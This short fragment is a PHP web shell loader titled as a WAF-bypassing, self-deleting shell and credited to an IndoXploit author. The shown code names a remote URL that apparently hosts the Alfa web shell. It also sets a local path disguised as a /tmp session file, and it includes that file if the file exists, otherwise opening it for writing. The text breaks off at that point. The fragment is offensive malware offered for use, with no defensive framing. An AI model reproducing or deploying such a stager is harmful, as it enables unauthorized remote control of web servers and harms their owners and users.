# Bypass 406 Not Acceptable & Auto Delete Shell (WAF Evasion Shell)
# Coded by: L0c4lh34rtz - IndoXploit $data = ['https://shell.prinsh.com/Nathan/alfa.txt', '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php']; if(file_exists($data[1]) && filesize($data[1]) !== 0) {


include($data[1]);
} else {
$fopen = fopen($data[1], 'w+');
